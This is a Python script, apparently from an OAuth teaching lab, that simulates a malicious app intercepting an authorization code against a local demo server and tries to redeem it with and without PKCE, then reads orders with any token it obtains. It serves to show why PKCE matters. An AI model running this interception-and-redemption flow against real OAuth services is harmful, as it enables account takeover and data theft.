"""Authorization code interception, with and without PKCE.

A malicious app on the same phone registered the Bookstore app's custom URI
scheme, so the operating system hands it the redirect with the code. It knows
the client_id and redirect_uri because they are public. It does not know the
code_verifier, which never left the real app.

Run: python attack.py              (server on http://127.0.0.1:8000)
     python attack.py --app-without-pkce
"""
import sys

import httpx

from client import AUTH_URL, code_from, redeem, start_login
from pkce import make_verifier


def intercept(http, use_pkce):
    # The real app starts the login, but the redirect lands in the malicious app.
    r, state, _real_verifier = start_login(http, use_pkce=use_pkce)
    return code_from(r.headers["location"], state)


def try_redeem(http, label, use_pkce, attacker_verifier):
    code = intercept(http, use_pkce)
    r = redeem(http, code, attacker_verifier)
    print(f"{label}\n  POST /token -> {r.status_code} {r.text}")
    if r.status_code == 200:
        token = r.json()["access_token"]
        o = http.get(AUTH_URL + "/orders", headers={"Authorization": "Bearer " + token})
        print(f"  GET /orders with the stolen token -> {o.status_code} {o.text}")


def main():
    use_pkce = "--app-without-pkce" not in sys.argv
    with httpx.Client(follow_redirects=False) as http:
        meta = http.get(AUTH_URL + "/.well-known/oauth-authorization-server").json()
        print("Server advertises:", meta.get("code_challenge_methods_supported", "no PKCE"))
        print("Real app sends a code_challenge:", use_pkce)
        try_redeem(http, "Attempt 1: stolen code, no code_verifier", use_pkce, None)
        try_redeem(http, "Attempt 2: stolen code, attacker's own code_verifier",
                   use_pkce, make_verifier())


if __name__ == "__main__":
    main()
